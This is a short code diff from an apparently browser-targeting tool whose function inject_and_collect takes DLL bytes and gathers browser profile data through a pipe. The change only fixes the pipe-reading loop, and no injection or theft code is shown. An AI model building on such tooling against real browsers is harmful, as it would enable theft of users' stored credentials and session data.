@@ -160,10 +160,13 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                 std::vector<unsigned char> buffer;
                 unsigned char temp[8192];
                 DWORD bytes_read;
-                while (ReadFile(pipe, temp, sizeof(temp), &bytes_read, nullptr) && bytes_read > 0) {
-                    buffer.insert(buffer.end(), temp, temp + bytes_read);
-                    if (GetLastError() != ERROR_MORE_DATA) break;
-                }
+                bool read_success;
+                do {
+                    read_success = ReadFile(pipe, temp, sizeof(temp), &bytes_read, nullptr);
+                    if (bytes_read > 0) {
+                        buffer.insert(buffer.end(), temp, temp + bytes_read);
+                    }
+                } while (!read_success && GetLastError() == ERROR_MORE_DATA);
 
                 if (!buffer.empty()) {
                     auto profiles = json::parse(buffer);
